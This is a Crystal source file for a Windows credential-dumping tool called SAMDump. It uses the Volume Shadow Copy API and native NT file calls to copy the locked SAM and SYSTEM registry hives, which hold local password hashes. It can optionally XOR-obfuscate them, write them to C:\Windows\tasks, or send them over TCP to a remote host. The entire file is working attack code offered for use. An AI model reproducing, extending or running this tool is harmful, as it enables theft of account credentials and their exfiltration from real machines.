require "socket"
require "uuid"


VSS_CTX_BACKUP = 0
VSS_CTX_ALL = 0xffffffff_u32
VSS_BT_FULL = 1
DEBUG_LEVEL = 1

enum VssObjectType
  VSS_OBJECT_UNKNOWN = 0
  VSS_OBJECT_NONE = 1
  VSS_OBJECT_SNAPSHOT_SET = 2
  VSS_OBJECT_SNAPSHOT = 3
  VSS_OBJECT_PROVIDER = 4
  VSS_OBJECT_TYPE_COUNT = 5
end


lib VssLib
  struct GUID
    data1 : UInt32
    data2 : UInt16
    data3 : UInt16
    data4 : UInt8[8]
  end

  struct VssSnapshotProp
    snapshot_id : GUID
    snapshot_set_id : GUID
    snapshots_count : Int32
    _padding1 : Int32
    snapshot_device_object : UInt16*
    original_volume_name : UInt16*
    originating_machine : UInt16*
    service_machine : UInt16*
    exposed_name : UInt16*
    exposed_path : UInt16*
    provider_id : GUID
    snapshot_attributes : Int32
    _padding2 : Int32
    creation_timestamp : Int64
    status : Int32
    _padding3 : Int32
  end

  union VssObjectUnion
    snap : VssSnapshotProp
  end

  struct VssObjectProp
    type : Int32
    _padding : Int32
    obj : VssObjectUnion
  end

  struct IVssEnumObjectVtbl
    query_interface : Proc(Void*, GUID*, Void**, Int32)
    add_ref : Proc(Void*, UInt32)
    release : Proc(Void*, UInt32)
    next : Proc(Void*, UInt32, VssObjectProp*, UInt32*, Int32)
    skip : Proc(Void*, UInt32, Int32)
    reset : Proc(Void*, Int32)
    clone : Proc(Void*, Void**, Int32)
  end

  struct IVssEnumObject
    vtbl : IVssEnumObjectVtbl*
  end

  struct IVssAsyncVtbl
    query_interface : Proc(Void*, GUID*, Void**, Int32)
    add_ref : Proc(Void*, UInt32)
    release : Proc(Void*, UInt32)
    cancel : Proc(Void*, Int32)
    wait : Proc(Void*, UInt32, Int32)
    query_status : Proc(Void*, Int32*, Int32*, Int32)
  end

  struct IVssAsync
    vtbl : IVssAsyncVtbl*
  end

  struct IVssBackupComponentsVtbl
    query_interface : Proc(Void*, GUID*, Void**, Int32)
    add_ref : Proc(Void*, UInt32)
    release : Proc(Void*, UInt32)
    get_writer_components_count : Proc(Void*, UInt32*, Int32)
    get_writer_components : Proc(Void*, UInt32, Void**, Int32)
    initialize_for_backup : Proc(Void*, UInt16*, Int32)
    set_backup_state : Proc(Void*, Int32, Int32, Int32, Int32, Int32)
    initialize_for_restore : Proc(Void*, UInt16*, Int32)
    set_restore_state : Proc(Void*, Int32, Int32)
    gather_writer_metadata : Proc(Void*, Void**, Int32)
    get_writer_metadata_count : Proc(Void*, UInt32*, Int32)
    get_writer_metadata : Proc(Void*, UInt32, GUID*, Void**, Int32)
    free_writer_metadata : Proc(Void*, Int32)
    add_component : Proc(Void*, GUID*, GUID*, Int32, UInt16*, UInt16*, Int32)
    prepare_for_backup : Proc(Void*, Void**, Int32)
    abort_backup : Proc(Void*, Int32)
    gather_writer_status : Proc(Void*, Void**, Int32)
    get_writer_status_count : Proc(Void*, UInt32*, Int32)
    free_writer_status : Proc(Void*, Int32)
    get_writer_status : Proc(Void*, UInt32, GUID*, GUID*, UInt16**, Int32*, Int32*, Int32*, UInt16**, Int32)
    set_backup_succeeded : Proc(Void*, GUID*, GUID*, Int32, UInt16*, UInt16*, Int32, Int32)
    set_backup_options : Proc(Void*, GUID*, Int32, UInt16*, UInt16*, UInt16*, Int32)
    set_selected_for_restore : Proc(Void*, GUID*, Int32, UInt16*, UInt16*, Int32, Int32)
    set_restore_options : Proc(Void*, GUID*, Int32, UInt16*, UInt16*, UInt16*, Int32)
    set_additional_restores : Proc(Void*, GUID*, Int32, UInt16*, UInt16*, Int32, Int32)
    set_previous_backup_stamp : Proc(Void*, GUID*, Int32, UInt16*, UInt16*, UInt16*, Int32)
    save_as_xml : Proc(Void*, UInt16**, Int32)
    backup_complete : Proc(Void*, Void**, Int32)
    add_alternative_location_mapping : Proc(Void*, GUID*, Int32, UInt16*, UInt16*, UInt16*, UInt16*, Int32, UInt16*, Int32)
    add_restore_subcomponent : Proc(Void*, GUID*, Int32, UInt16*, UInt16*, UInt16*, UInt16*, Int32, Int32)
    set_file_restore_status : Proc(Void*, GUID*, Int32, UInt16*, UInt16*, Int32, Int32)
    add_new_target : Proc(Void*, GUID*, Int32, UInt16*, UInt16*, UInt16*, UInt16*, Int32, UInt16*, Int32)
    set_ranges_file_path : Proc(Void*, GUID*, Int32, UInt16*, UInt16*, UInt32, UInt16*, Int32)
    pre_restore : Proc(Void*, Void**, Int32)
    post_restore : Proc(Void*, Void**, Int32)
    set_context : Proc(Void*, Int32, Int32)
    start_snapshot_set : Proc(Void*, GUID*, Int32)
    add_to_snapshot_set : Proc(Void*, UInt16*, GUID*, GUID*, Int32)
    do_snapshot_set : Proc(Void*, Void**, Int32)
    delete_snapshots : Proc(Void*, GUID, Int32, Int32, Int32*, GUID*, Int32)
    import_snapshots : Proc(Void*, Void**, Int32)
    break_snapshot_set : Proc(Void*, GUID*, Int32)
    get_snapshot_properties : Proc(Void*, GUID*, VssSnapshotProp*, Int32)
    query : Proc(Void*, GUID*, Int32, Int32, Void**, Int32)
    is_volume_supported : Proc(Void*, GUID*, UInt16*, Int32*, Int32)
    disable_writer_classes : Proc(Void*, GUID*, UInt32, Int32)
    enable_writer_classes : Proc(Void*, GUID*, UInt32, Int32)
    disable_writer_instances : Proc(Void*, GUID*, UInt32, Int32)
    expose_snapshot : Proc(Void*, GUID*, UInt16*, Int32, UInt16*, UInt16**, Int32)
    revert_to_snapshot : Proc(Void*, GUID*, Int32, Int32)
    query_revert_status : Proc(Void*, UInt16*, Void**, Int32)
  end

  struct IVssBackupComponents
    vtbl : IVssBackupComponentsVtbl*
  end
end


lib WinVSS
  FILE_READ_DATA = 0x0001_u32
  FILE_WRITE_DATA = 0x0002_u32
  FILE_READ_ATTRIBUTES = 0x0080_u32
  FILE_WRITE_ATTRIBUTES = 0x0100_u32
  SYNCHRONIZE = 0x00100000_u32
  FILE_SHARE_READ = 0x00000001_u32
  FILE_SHARE_WRITE = 0x00000002_u32
  FILE_OPEN = 0x00000001_u32
  FILE_OVERWRITE_IF = 0x00000005_u32
  FILE_SYNCHRONOUS_IO_NONALERT = 0x00000020_u32
  FILE_ATTRIBUTE_NORMAL = 0x00000080_u32
  OBJ_CASE_INSENSITIVE = 0x00000040_u32

  struct UnicodeString
    length : UInt16
    maximum_length : UInt16
    buffer : UInt16*
  end

  struct ObjectAttributes
    length : UInt32
    root_directory : Void*
    object_name : UnicodeString*
    attributes : UInt32
    security_descriptor : Void*
    security_quality_of_service : Void*
  end

  struct IoStatusBlock
    status : UInt32
    padding : UInt32
    information : LibC::SizeT
  end

  fun nt_create_file = NtCreateFile(
    file_handle : Void**,
    desired_access : UInt32,
    object_attributes : ObjectAttributes*,
    io_status_block : IoStatusBlock*,
    allocation_size : Void*,
    file_attributes : UInt32,
    share_access : UInt32,
    create_disposition : UInt32,
    create_options : UInt32,
    ea_buffer : Void*,
    ea_length : UInt32
  ) : UInt32

  fun nt_read_file = NtReadFile(
    file_handle : Void*,
    event : Void*,
    apc_routine : Void*,
    apc_context : Void*,
    io_status_block : IoStatusBlock*,
    buffer : UInt8*,
    length : UInt32,
    byte_offset : Int64*,
    key : Void*
  ) : UInt32

  fun nt_write_file = NtWriteFile(
    file_handle : Void*,
    event : Void*,
    apc_routine : Void*,
    apc_context : Void*,
    io_status_block : IoStatusBlock*,
    buffer : UInt8*,
    length : UInt32,
    byte_offset : Int64*,
    key : Void*
  ) : UInt32

  fun nt_close = NtClose(handle : Void*) : UInt32
end


lib Kernel32
  fun load_library = LoadLibraryW(UInt16*) : Void*
  fun get_proc_address = GetProcAddress(Void*, UInt8*) : Void*
end


lib Ole32
  fun co_initialize_ex = CoInitializeEx(Void*, UInt32) : Int32
  fun co_uninitialize = CoUninitialize : Void
end


lib Shell32
  fun is_user_an_admin = IsUserAnAdmin : Int32
end


COINIT_MULTITHREADED = 0x0_u32


def is_administrator? : Bool
  Shell32.is_user_an_admin != 0
end


def guid_to_string(guid : VssLib::GUID) : String
  bytes = StaticArray(UInt8, 16).new(0)
  bytes_ptr = bytes.to_unsafe.as(UInt32*)
  bytes_ptr.value = guid.data1
  (bytes_ptr + 1).as(UInt16*).value = guid.data2
  (bytes_ptr + 1).as(UInt16*)[1] = guid.data3
  8.times { |i| bytes[8 + i] = guid.data4[i] }
  
  uuid = UUID.new(bytes)
  uuid.to_s
end


def wstring_to_string(ptr : UInt16*) : String
  return "" if ptr.null?
  
  size = 0
  temp = ptr
  while temp.value != 0
    size += 1
    temp += 1
  end
  
  String.build do |str|
    i = 0
    while i < size
      char = ptr[i].to_i32
      
      if char >= 0xD800 && char <= 0xDBFF && i + 1 < size
        low = ptr[i + 1].to_i32
        if low >= 0xDC00 && low <= 0xDFFF
          codepoint = 0x10000 + ((char - 0xD800) << 10) + (low - 0xDC00)
          str << codepoint.chr
          i += 2
          next
        end
      end
      
      str << char.chr if char < 0xD800 || char > 0xDFFF
      i += 1
    end
  end
end


def create_null_guid : VssLib::GUID
  VssLib::GUID.new(
    data1: 0_u32,
    data2: 0_u16,
    data3: 0_u16,
    data4: StaticArray(UInt8, 8).new(0_u8)
  )
end


def load_create_vss_function : Proc(Pointer(Pointer(VssLib::IVssBackupComponents)), Int32)?
  dll_name = "VssApi.dll".to_utf16
  vss_handle = Kernel32.load_library(dll_name.to_unsafe)
  
  return nil if vss_handle.null?
  
  possible_names = [
    "CreateVssBackupComponentsInternal",
    "CreateVssBackupComponents",
    "?CreateVssBackupComponents@@YAJPEAPEAVIVssBackupComponents@@@Z"
  ]
  
  possible_names.each do |name|
    func_ptr = Kernel32.get_proc_address(vss_handle, name.to_unsafe)
    unless func_ptr.null?
      return Proc(Pointer(Pointer(VssLib::IVssBackupComponents)), Int32).new(func_ptr, Pointer(Void).null)
    end
  end
  
  nil
end


def load_vss_free_function : Proc(Pointer(VssLib::VssSnapshotProp), Nil)?
  dll_name = "VssApi.dll".to_utf16
  vss_handle = Kernel32.load_library(dll_name.to_unsafe)
  
  return nil if vss_handle.null?
  
  func_ptr = Kernel32.get_proc_address(vss_handle, "VssFreeSnapshotProperties".to_unsafe)
  return nil if func_ptr.null?
  
  Proc(Pointer(VssLib::VssSnapshotProp), Nil).new(func_ptr, Pointer(Void).null)
end


def list_shadows : String?
  com_initialized = false
  
  begin
    hr = Ole32.co_initialize_ex(nil, COINIT_MULTITHREADED)
    if hr == 0 || hr == 1
      com_initialized = true
    elsif hr != -2147417850
      puts "Error initializing COM. Error: 0x#{hr.to_s(16)}"
      return nil
    end
  rescue ex
    puts "Exception initializing COM: #{ex.message}"
    return nil
  end
  
  create_func = load_create_vss_function
  unless create_func
    puts "Error: Could not load CreateVssBackupComponents from VssApi.dll"
    return nil
  end
  
  free_func = load_vss_free_function
  unless free_func
    puts "Error: Could not load VssFreeSnapshotProperties from VssApi.dll"
    return nil
  end
  
  backup : VssLib::IVssBackupComponents* = Pointer(VssLib::IVssBackupComponents).null
  enum_obj : VssLib::IVssEnumObject* = Pointer(VssLib::IVssEnumObject).null
  
  begin
    hr = create_func.call(pointerof(backup))
    if hr != 0
      puts "Error creating VSS components. HRESULT: 0x#{hr.to_s(16)}"
      return nil
    end
    
    if backup.null?
      puts "Error: CreateVssBackupComponents returned NULL"
      return nil
    end
    
    vtbl = backup.value.vtbl
    hr = vtbl.value.initialize_for_backup.call(backup.as(Void*), Pointer(UInt16).null)
    if hr != 0
      puts "Error in InitializeForBackup. HRESULT: 0x#{hr.to_s(16)}"
      case hr
      when 0x80042302
        puts "  -> VSS_E_UNEXPECTED: Unexpected VSS error"
      when 0x8004230C
        puts "  -> VSS_E_BAD_STATE: VSS in incorrect state"
      when 0x80042308
        puts "  -> VSS_E_VOLUME_NOT_SUPPORTED_BY_PROVIDER: Volume not supported"
      end
      return nil
    end
    
    vss_ctx_all_as_signed = VSS_CTX_ALL.unsafe_as(Int32)
    hr = vtbl.value.set_context.call(backup.as(Void*), vss_ctx_all_as_signed)
    if hr != 0
      hr = vtbl.value.set_context.call(backup.as(Void*), VSS_CTX_BACKUP)
      if hr != 0
        puts "Error in SetContext. HRESULT: 0x#{hr.to_s(16)}"
        return nil
      end
    end
    
    guid_null = create_null_guid
    
    hr = vtbl.value.query.call(
      backup.as(Void*),
      pointerof(guid_null),
      VssObjectType::VSS_OBJECT_NONE.value,
      VssObjectType::VSS_OBJECT_SNAPSHOT.value,
      pointerof(enum_obj).as(Pointer(Pointer(Void)))
    )
    
    if hr != 0 || enum_obj.null?
      return nil
    end
    
    enum_vtbl = enum_obj.value.vtbl
    
    loop do
      prop = VssLib::VssObjectProp.new
      fetched = 0_u32
      
      hr = enum_vtbl.value.next.call(enum_obj.as(Void*), 1_u32, pointerof(prop), pointerof(fetched))
      
      break if hr != 0 || fetched == 0
      
      if prop.type == VssObjectType::VSS_OBJECT_SNAPSHOT.value
        snap = prop.obj.snap
        
        device_object = ""
        unless snap.snapshot_device_object.null?
          device_object = wstring_to_string(snap.snapshot_device_object)
          free_func.call(pointerof(snap))
          return device_object
        end
        
        free_func.call(pointerof(snap))
      end
    end
    
    return nil
    
  rescue ex
    puts "Error: #{ex.message}"
    return nil
  ensure
    unless enum_obj.null?
      enum_vtbl = enum_obj.value.vtbl
      enum_vtbl.value.release.call(enum_obj.as(Void*))
    end
    
    unless backup.null?
      vtbl = backup.value.vtbl
      vtbl.value.release.call(backup.as(Void*))
    end
    
    Ole32.co_uninitialize if com_initialized
  end
end


def create_shadow(volume_path : String) : String?
  com_initialized = false
  
  begin
    hr = Ole32.co_initialize_ex(nil, COINIT_MULTITHREADED)
    if hr == 0 || hr == 1
      com_initialized = true
    elsif hr != -2147417850
      puts "Error initializing COM. Error: 0x#{hr.to_s(16)}"
      return nil
    end
  rescue ex
    puts "Exception initializing COM: #{ex.message}"
    return nil
  end
  
  create_func = load_create_vss_function
  unless create_func
    puts "Error: Could not load CreateVssBackupComponents from VssApi.dll"
    return nil
  end
  
  free_func = load_vss_free_function
  unless free_func
    puts "Error: Could not load VssFreeSnapshotProperties from VssApi.dll"
    return nil
  end
  
  backup : VssLib::IVssBackupComponents* = Pointer(VssLib::IVssBackupComponents).null
  
  begin
    hr = create_func.call(pointerof(backup))
    if hr != 0
      puts "Error creating VSS components. HRESULT: 0x#{hr.to_s(16)}"
      return nil
    end
    
    if backup.null?
      puts "Error: CreateVssBackupComponents returned NULL"
      return nil
    end
    
    vtbl = backup.value.vtbl
    hr = vtbl.value.initialize_for_backup.call(backup.as(Void*), Pointer(UInt16).null)
    if hr != 0
      puts "Error in InitializeForBackup. HRESULT: 0x#{hr.to_s(16)}"
      return nil
    end
    
    guid_null = create_null_guid
    volume_utf16 = volume_path.to_utf16
    
    is_supported = 0
    hr = vtbl.value.is_volume_supported.call(
      backup.as(Void*),
      pointerof(guid_null),
      volume_utf16.to_unsafe,
      pointerof(is_supported)
    )
    
    if hr != 0 || is_supported == 0
      puts "Volume #{volume_path} is not supported for shadow copies."
      return nil
    end
    
    hr = vtbl.value.set_context.call(backup.as(Void*), VSS_CTX_BACKUP)
    if hr != 0
      puts "Error in SetContext. HRESULT: 0x#{hr.to_s(16)}"
      return nil
    end
    
    hr = vtbl.value.set_backup_state.call(backup.as(Void*), 0, 0, VSS_BT_FULL, 0)
    if hr != 0
      puts "Error in SetBackupState. HRESULT: 0x#{hr.to_s(16)}"
      return nil
    end
    
    async_metadata : VssLib::IVssAsync* = Pointer(VssLib::IVssAsync).null
    hr = vtbl.value.gather_writer_metadata.call(backup.as(Void*), pointerof(async_metadata).as(Pointer(Pointer(Void))))
    if hr == 0 && !async_metadata.null?
      async_vtbl = async_metadata.value.vtbl
      async_vtbl.value.wait.call(async_metadata.as(Void*), 0xFFFFFFFF_u32)
      async_vtbl.value.release.call(async_metadata.as(Void*))
    end
    
    snapshot_set_id = VssLib::GUID.new
    hr = vtbl.value.start_snapshot_set.call(backup.as(Void*), pointerof(snapshot_set_id))
    if hr != 0
      puts "Error in StartSnapshotSet. HRESULT: 0x#{hr.to_s(16)}"
      return nil
    end
    
    snapshot_id = VssLib::GUID.new
    hr = vtbl.value.add_to_snapshot_set.call(
      backup.as(Void*),
      volume_utf16.to_unsafe,
      pointerof(guid_null),
      pointerof(snapshot_id)
    )
    if hr != 0
      puts "Error in AddToSnapshotSet. HRESULT: 0x#{hr.to_s(16)}"
      return nil
    end
    
    async_prepare : VssLib::IVssAsync* = Pointer(VssLib::IVssAsync).null
    hr = vtbl.value.prepare_for_backup.call(backup.as(Void*), pointerof(async_prepare).as(Pointer(Pointer(Void))))
    if hr == 0 && !async_prepare.null?
      async_vtbl = async_prepare.value.vtbl
      async_vtbl.value.wait.call(async_prepare.as(Void*), 0xFFFFFFFF_u32)
      async_vtbl.value.release.call(async_prepare.as(Void*))
    end
    
    async_snapshot : VssLib::IVssAsync* = Pointer(VssLib::IVssAsync).null
    hr = vtbl.value.do_snapshot_set.call(backup.as(Void*), pointerof(async_snapshot).as(Pointer(Pointer(Void))))
    if hr == 0 && !async_snapshot.null?
      async_vtbl = async_snapshot.value.vtbl
      hr = async_vtbl.value.wait.call(async_snapshot.as(Void*), 0xFFFFFFFF_u32)
      async_vtbl.value.release.call(async_snapshot.as(Void*))
    end
    
    if hr == 0
      snap_prop = VssLib::VssSnapshotProp.new
      hr = vtbl.value.get_snapshot_properties.call(
        backup.as(Void*),
        pointerof(snapshot_id),
        pointerof(snap_prop)
      )
      
      if hr == 0
        device_object = ""
        unless snap_prop.snapshot_device_object.null?
          device_object = wstring_to_string(snap_prop.snapshot_device_object)
        end
        
        free_func.call(pointerof(snap_prop))
        return device_object
      else
        puts "Error in GetSnapshotProperties. HRESULT: 0x#{hr.to_s(16)}"
      end
    else
      puts "Error in DoSnapshotSet. HRESULT: 0x#{hr.to_s(16)}"
    end
    
    return nil
    
  rescue ex
    puts "Error: #{ex.message}"
    puts ex.backtrace.join("\n")
    return nil
  ensure
    unless backup.null?
      vtbl = backup.value.vtbl
      vtbl.value.release.call(backup.as(Void*))
    end
    
    Ole32.co_uninitialize if com_initialized
  end
end


def open_file_nt(file_path : String) : Void*?
  utf16_path = file_path.to_utf16
  
  unicode_string = WinVSS::UnicodeString.new
  unicode_string.buffer = utf16_path.to_unsafe
  unicode_string.length = (file_path.size * 2).to_u16
  unicode_string.maximum_length = ((file_path.size * 2) + 2).to_u16

  object_attributes = WinVSS::ObjectAttributes.new
  object_attributes.length = sizeof(WinVSS::ObjectAttributes).to_u32
  object_attributes.root_directory = nil
  object_attributes.object_name = pointerof(unicode_string)
  object_attributes.attributes = WinVSS::OBJ_CASE_INSENSITIVE
  object_attributes.security_descriptor = nil
  object_attributes.security_quality_of_service = nil

  io_status_block = WinVSS::IoStatusBlock.new
  file_handle = Pointer(Void).null

  status = WinVSS.nt_create_file(
    pointerof(file_handle),
    WinVSS::FILE_READ_DATA | WinVSS::FILE_READ_ATTRIBUTES | WinVSS::SYNCHRONIZE,
    pointerof(object_attributes),
    pointerof(io_status_block),
    nil,
    0_u32,
    WinVSS::FILE_SHARE_READ | WinVSS::FILE_SHARE_WRITE,
    WinVSS::FILE_OPEN,
    WinVSS::FILE_SYNCHRONOUS_IO_NONALERT,
    nil,
    0_u32
  )

  if status != 0
    puts "[-] Error opening the file. NTSTATUS: 0x#{status.to_s(16)}"
    return nil
  end

  file_handle
end


def read_bytes_nt(file_handle : Void*) : Array(UInt8)
  file_content = Array(UInt8).new
  byte_offset = 0_i64

  loop do
    buffer = Bytes.new(4096)
    io_status_block = WinVSS::IoStatusBlock.new
    io_status_block.status = 0_u32
    io_status_block.padding = 0_u32
    io_status_block.information = 0_u64

    status = WinVSS.nt_read_file(
      file_handle,
      nil,
      nil,
      nil,
      pointerof(io_status_block),
      buffer.to_unsafe,
      buffer.size.to_u32,
      pointerof(byte_offset),
      nil
    )

    if status == 0xC0000011_u32
      break
    end
    
    if status != 0 && status != 0x00000103_u32
      puts "[-] Error reading. NTSTATUS: 0x#{status.to_s(16)}"
      break
    end

    bytes_read = io_status_block.information.to_u32
    
    if bytes_read > 0
      file_content.concat(buffer[0, bytes_read])
      byte_offset += bytes_read
    end
    
    if bytes_read == 0 && status == 0
      break
    end
  end

  file_content
end


def read_file(file_path : String, print_bool : Bool) : Array(UInt8)
  file_content = Array(UInt8).new

  file_handle = open_file_nt(file_path)
  if file_handle.nil?
    puts "[-] Error: Not possible to open the file."
    return file_content
  end

  file_content = read_bytes_nt(file_handle)
  
  if DEBUG_LEVEL >= 1 && print_bool
    puts "[+] Read #{file_content.size} bytes from #{file_path}"
  end
  
  WinVSS.nt_close(file_handle)
  
  file_content
end


def write_file_nt(file_path : String, file_data : Array(UInt8)) : Bool
  utf16_path = file_path.to_utf16
  
  unicode_string = WinVSS::UnicodeString.new
  unicode_string.buffer = utf16_path.to_unsafe
  unicode_string.length = (file_path.size * 2).to_u16
  unicode_string.maximum_length = ((file_path.size * 2) + 2).to_u16

  object_attributes = WinVSS::ObjectAttributes.new
  object_attributes.length = sizeof(WinVSS::ObjectAttributes).to_u32
  object_attributes.root_directory = nil
  object_attributes.object_name = pointerof(unicode_string)
  object_attributes.attributes = WinVSS::OBJ_CASE_INSENSITIVE
  object_attributes.security_descriptor = nil
  object_attributes.security_quality_of_service = nil

  io_status_block = WinVSS::IoStatusBlock.new
  file_handle = Pointer(Void).null

  status = WinVSS.nt_create_file(
    pointerof(file_handle),
    WinVSS::FILE_WRITE_DATA | WinVSS::FILE_WRITE_ATTRIBUTES | WinVSS::SYNCHRONIZE,
    pointerof(object_attributes),
    pointerof(io_status_block),
    nil,
    WinVSS::FILE_ATTRIBUTE_NORMAL,
    WinVSS::FILE_SHARE_READ,
    WinVSS::FILE_OVERWRITE_IF,
    WinVSS::FILE_SYNCHRONOUS_IO_NONALERT,
    nil,
    0_u32
  )

  if status != 0
    puts "[-] Error creating file: #{file_path}. NTSTATUS: 0x#{status.to_s(16)}"
    return false
  end

  byte_offset = 0_i64
  data_slice = file_data.to_unsafe.to_slice(file_data.size)

  status = WinVSS.nt_write_file(
    file_handle,
    nil,
    nil,
    nil,
    pointerof(io_status_block),
    data_slice.to_unsafe,
    data_slice.size.to_u32,
    pointerof(byte_offset),
    nil
  )

  if status != 0
    puts "[-] Error writing to file: #{file_path}. NTSTATUS: 0x#{status.to_s(16)}"
    WinVSS.nt_close(file_handle)
    return false
  end

  puts "[+] Written #{file_data.size} bytes to #{file_path}" if DEBUG_LEVEL >= 1

  WinVSS.nt_close(file_handle)
  true
end


def encode_bytes(dump_bytes : Array(UInt8), key_xor : String) : Array(UInt8)
  encoded_bytes = dump_bytes.dup

  return encoded_bytes if key_xor.empty?

  key_len = key_xor.size

  encoded_bytes.each_with_index do |byte, i|
    encoded_bytes[i] = byte ^ key_xor[i % key_len].ord.to_u8
  end

  encoded_bytes
end


def send_file_over_socket(sock : TCPSocket, filename : String, filedata : Array(UInt8)) : Bool
  filename_bytes = Bytes.new(32, 0_u8)
  source_bytes = filename.to_slice
  filename_bytes.copy_from(source_bytes.to_unsafe, Math.min(source_bytes.size, 32))

  filesize_int = filedata.size
  filesize_bytes = Bytes.new(4)
  IO::ByteFormat::BigEndian.encode(filesize_int.to_u32, filesize_bytes)

  checksum_bytes = Bytes.new(4)
  IO::ByteFormat::BigEndian.encode(0_u32, checksum_bytes)

  header = Bytes.new(40)
  header.copy_from(filename_bytes.to_unsafe, 32)
  header[32, 4].copy_from(filesize_bytes.to_unsafe, 4)
  header[36, 4].copy_from(checksum_bytes.to_unsafe, 4)

  begin
    sock.write(header)
    sock.flush
    
    data_slice = filedata.to_unsafe.to_slice(filedata.size)
    sock.write(data_slice)
    sock.flush

    puts "[+] #{filename} sent (#{filedata.size} bytes)" if DEBUG_LEVEL >= 1
    true
  rescue ex
    puts "[-] Error sending file: #{ex.message}"
    false
  end
end


def send_files_remotely(sam_data : Array(UInt8), system_data : Array(UInt8), host : String, port : Int32) : Bool
  begin
    sock = TCPSocket.new(host, port)

    puts "[+] Connected to #{host}:#{port}" if DEBUG_LEVEL >= 1

    success = true
    success = send_file_over_socket(sock, "sam", sam_data) && success
    success = send_file_over_socket(sock, "system", system_data) && success

    sock.close

    success
  rescue ex
    puts "[-] Error connecting to #{host}:#{port}: #{ex.message}"
    false
  end
end


def save_files_locally(sam_data : Array(UInt8), system_data : Array(UInt8), 
                       base_path : String, sam_fname : String, system_fname : String) : Bool
  success = true
  sam_path = "\\??\\" + base_path + sam_fname
  system_path = "\\??\\" + base_path + system_fname

  unless write_file_nt(sam_path, sam_data)
    puts "[-] Error storing sam"
    success = false
  end

  unless write_file_nt(system_path, system_data)
    puts "[-] Error storing system"
    success = false
  end

  success
end


def print_help
  puts "Usage: SAMDump [OPTIONS]"
  puts "Options:"
  puts "  --save-local [BOOL]    Save locally (default: false)"
  puts "  --output-dir DIR       Output directory (default: C:\\Windows\\tasks)"
  puts "  --send-remote [BOOL]   Send remotely (default: false)"
  puts "  --host IP              Host for remote sending (default: 127.0.0.1)"
  puts "  --port PORT            Port for remote sending (default: 7777)"
  puts "  --xor-encode [BOOL]    XOR Encode (default: false)"
  puts "  --xor-key KEY          Enable XOR with specified key (default: SAMDump2025)"
  puts "  --disk DISK            Disk for shadow copy (default: C:\\)"
  puts "  --help                 Show this help"
  exit(0)
end


def parse_arguments(args : Array(String))
  output_dir = "C:\\Windows\\tasks"
  disk_to_shadow = "C:\\"
  xor_encode = false
  save_locally = false
  send_remotely = false
  key_xor = "SAMDump2025"
  host = "127.0.0.1"
  port = 7777

  i = 0
  while i < args.size
    case args[i]
    when "--output-dir"
      output_dir = args[i + 1] if i + 1 < args.size
      i += 1
    when "--disk"
      disk_to_shadow = args[i + 1] if i + 1 < args.size
      i += 1
    when "--xor-key"
      key_xor = args[i + 1] if i + 1 < args.size
      xor_encode = true
      i += 1
    when "--save-local"
      if i + 1 < args.size && !args[i + 1].starts_with?("--")
        value = args[i + 1].downcase
        save_locally = value == "true" || value == "1" || value == "yes"
        i += 1
      else
        save_locally = true
      end
    when "--send-remote"
      if i + 1 < args.size && !args[i + 1].starts_with?("--")
        value = args[i + 1].downcase
        send_remotely = value == "true" || value == "1" || value == "yes"
        i += 1
      else
        send_remotely = true
      end
    when "--xor-encode"
      if i + 1 < args.size && !args[i + 1].starts_with?("--")
        value = args[i + 1].downcase
        xor_encode = value == "true" || value == "1" || value == "yes"
        i += 1
      else
        xor_encode = true
      end
    when "--host"
      host = args[i + 1] if i + 1 < args.size
      i += 1
    when "--port"
      port = args[i + 1].to_i if i + 1 < args.size
      i += 1
    when "--help"
      print_help
    end
    i += 1
  end

  {output_dir, disk_to_shadow, xor_encode, save_locally, send_remotely, key_xor, host, port}
end


unless is_administrator?
  puts "ERROR: Administrator privileges required"
  exit(1)
end

config = parse_arguments(ARGV)
output_dir, disk_to_shadow, xor_encode, save_locally, send_remotely, key_xor, host, port = config

if !save_locally && !send_remotely
  print_help
end

shadow_copy_base_path = list_shadows
new_shadow_created = false

if shadow_copy_base_path
  puts "[+] Shadow Copy found: #{shadow_copy_base_path}" if DEBUG_LEVEL >= 1
else
  puts "[+] No Shadow Copies found: Creating a new one." if DEBUG_LEVEL >= 1
  
  shadow_copy_base_path = create_shadow(disk_to_shadow)
  
  if shadow_copy_base_path
    puts "[+] Shadow copy created: #{shadow_copy_base_path}"
    new_shadow_created = true
  else
    puts "\n[-] Failed to create a Shadow copy."
    exit(1)
  end
end

if shadow_copy_base_path
  shadow_copy_base_path = shadow_copy_base_path.gsub("\\\\?\\", "\\??\\")

  sam_path = "\\windows\\system32\\config\\sam"
  system_path = "\\windows\\system32\\config\\system"
  full_path_sam = shadow_copy_base_path + sam_path
  full_path_system = shadow_copy_base_path + system_path

  sam_bytes = read_file(full_path_sam, true)
  system_bytes = read_file(full_path_system, true)

  if new_shadow_created
    sam_bytes = read_file(full_path_sam, false)
    system_bytes = read_file(full_path_system, false)
  end

  if xor_encode
    sam_bytes = encode_bytes(sam_bytes, key_xor)
    system_bytes = encode_bytes(system_bytes, key_xor)

    puts "[+] XOR-encoded sam and system content" if DEBUG_LEVEL >= 1
  end

  if save_locally
    sam_fname = "\\sam.txt"
    system_fname = "\\system.txt"

    if save_files_locally(sam_bytes, system_bytes, output_dir, sam_fname, system_fname)
      puts "[+] Success saving files locally" if DEBUG_LEVEL >= 1
    else
      puts "[-] Error saving files locally"
    end
  end

  if send_remotely
    if send_files_remotely(sam_bytes, system_bytes, host, port)
      puts "[+] Success sending files" if DEBUG_LEVEL >= 1
    else
      puts "[-] Error sending files"
    end
  end
end